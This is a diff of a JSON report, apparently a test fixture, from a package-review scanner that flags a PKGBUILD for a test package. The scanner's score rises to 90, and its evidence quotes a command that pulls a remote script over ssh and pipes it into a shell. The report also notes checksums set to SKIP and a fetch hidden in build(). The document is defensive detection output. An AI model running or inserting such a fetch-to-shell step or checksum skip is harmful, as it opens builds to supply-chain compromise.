@@ -13,7 +13,7 @@
     "catching_rules": [],
     "coverage_gaps": [],
     "fatal": false,
-    "rationale": "score 65 > threshold 20",
+    "rationale": "score 90 > threshold 20",
     "verdict": "detected"
   },
   "stages": {
@@ -22,7 +22,7 @@
       "chain": "ssh -> pipe -> shell",
       "preserved": true,
       "reason": "",
-      "validator_version": "sha256:368bb45c32cc6123445b114f08f7e3b11774bd130049ec160f3ebbcc966b6025"
+      "validator_version": "sha256:7989a784ea740b8f6cec6fb024afd7cc6d5b7514d5b30f55ab51e76d2a393ec1"
     },
     "constraints": {
       "honored": true,
@@ -41,16 +41,86 @@
   },
   "status": "detected",
   "trustsight": {
-    "config_fingerprint": "sha256:873602644c2b4e25ade83a64343e6a338f7dfc0ebf67a9bc3f92c25beb317148",
+    "config_fingerprint": "sha256:df3acb4dc501b1a52b6cf40617c4bc7330c6ac74397cb08aa09f0b2e63a377f9",
     "report": {
+      "acknowledged_urls": [],
       "cached": false,
       "cached_at": "",
+      "change": {
+        "checkdependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "checksum_behavior": "changed_from_sha256_to_skip",
+        "checksums": {
+          "gained": [
+            "SKIP"
+          ],
+          "lost": [
+            "0000000000000000000000000000000000000000000000000000000000000000"
+          ],
+          "reordered": false
+        },
+        "dependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "files": [
+          {
+            "hunks": [
+              1
+            ],
+            "old_path": "PKGBUILD",
+            "path": "PKGBUILD",
+            "status": "modified"
+          }
+        ],
+        "hosts_gained": [],
+        "hosts_lost": [],
+        "local_sources_gained": [],
+        "local_sources_lost": [],
+        "makedependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "optdependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "pgp_keys": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "reordered": false,
+        "sources": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "version": {
+          "moved": false,
+          "new_epoch": "",
+          "new_pkgrel": "1",
+          "new_pkgver": "1.0.0",
+          "old_epoch": "",
+          "old_pkgrel": "1",
+          "old_pkgver": "1.0.0",
+          "pkgver_changed": false
+        }
+      },
       "changes": [
         "checksums changed from sha256 to SKIP"
       ],
-      "config_fingerprint": "sha256:873602644c2b4e25ade83a64343e6a338f7dfc0ebf67a9bc3f92c25beb317148",
+      "comparison_base": "",
+      "config_fingerprint": "sha256:df3acb4dc501b1a52b6cf40617c4bc7330c6ac74397cb08aa09f0b2e63a377f9",
       "coverage_gaps": [
-        "tree_not_analyzed"
+        "tree_not_analyzed",
+        "ruleset_drifted"
       ],
       "coverage_gaps_carried": [],
       "dependencies": [],
@@ -71,7 +141,7 @@
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
-          "line": 17,
+          "line": 8,
           "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}"
@@ -84,10 +154,23 @@
             "shape": "uncatalogued fetch to a shell"
           },
           "file": "PKGBUILD",
-          "line": 22,
+          "line": 11,
           "rule_id": "X009",
           "severity": "CRITICAL",
           "template": "Fetch Through An Uncatalogued Client: {match}"
+        },
+        {
+          "description": "build() fetches buildbox from outside the declared source array [H016]",
+          "evidence": {
+            "match": "build() downloads buildbox, which is not in source=()",
+            "position": "build",
+            "url": "buildbox"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "rule_id": "H016",
+          "severity": "HIGH",
+          "template": "{position}() fetches {url} from outside the declared source array"
         }
       ],
       "first_seen": false,
@@ -100,13 +183,36 @@
       "old_commit": "",
       "old_version": "1.0.0",
       "package": "harness-pkg",
+      "partial_files": [],
       "required_by": [],
+      "resolution_coverage": {
+        "resolved_lines": 2,
+        "resolved_target_rules": [
+          "R001",
+          "R002",
+          "R003",
+          "R008",
+          "R012",
+          "R039",
+          "R040",
+          "R041",
+          "R042",
+          "R043",
+          "R044",
+          "R045",
+          "R055",
+          "R056",
+          "R057"
+        ],
+        "resolved_target_rules_fired": [],
+        "unresolved_lines": 0
+      },
       "review_profile": "default",
       "review_threshold": 20,
-      "risk": "High",
-      "risk_label": "High (incomplete analysis)",
+      "risk": "Critical",
+      "risk_label": "Critical (incomplete analysis)",
       "scan_truncated": false,
-      "score": 65,
+      "score": 90,
       "score_breakdown": [
         {
           "evidence": {
@@ -114,7 +220,7 @@
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
-          "line": 17,
+          "line": 8,
           "params": {
             "skip_suffix": ""
           },
@@ -131,7 +237,7 @@
             "shape": "uncatalogued fetch to a shell"
           },
           "file": "PKGBUILD",
-          "line": 22,
+          "line": 11,
           "params": {
             "body": "ssh buildbox cat /srv/stage.sh | sh",
             "shape": "uncatalogued fetch to a shell"
@@ -160,15 +266,33 @@
         },
         {
           "evidence": {
-            "match": "rule hits span 3 distinct capability categories",
-            "n_categories": 3
+            "match": "build() downloads buildbox, which is not in source=()",
+            "position": "build",
+            "url": "buildbox"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "params": {
+            "position": "build",
+            "url": "buildbox"
+          },
+          "reason": "Hidden Network Fetch In Build: build() downloads buildbox, which is not in source=()",
+          "rule_id": "H016",
+          "severity": "HIGH",
+          "template": "{position}() fetches {url} from outside the declared source array",
+          "weight": 25
+        },
+        {
+          "evidence": {
+            "match": "rule hits span 4 distinct capability categories",
+            "n_categories": 4
           },
           "file": "",
           "line": null,
           "params": {
-            "n_categories": 3
+            "n_categories": 4
           },
-          "reason": "Capability Density Anomaly: rule hits span 3 distinct capability categories",
+          "reason": "Capability Density Anomaly: rule hits span 4 distinct capability categories",
           "rule_id": "H027",
           "severity": "INFO",
           "template": "findings span {n_categories} distinct capability categories",
@@ -188,12 +312,28 @@
           "severity": "INFO",
           "template": "",
           "weight": 0
+        },
+        {
+          "evidence": {
+            "gap": "ruleset_drifted"
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "gap": "ruleset_drifted"
+          },
+          "reason": "Coverage gap: the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents",
+          "rule_id": "COVERAGE",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD. Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]; checksum set to SKIP [H001]. Review the diff before building.",
+      "unresolved_assignments": [],
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD. Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]; checksum set to SKIP [H001]; build() fetches buildbox from outside the declared source array [H016]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 781
+    "wall_clock_ms": 764
   }
 }
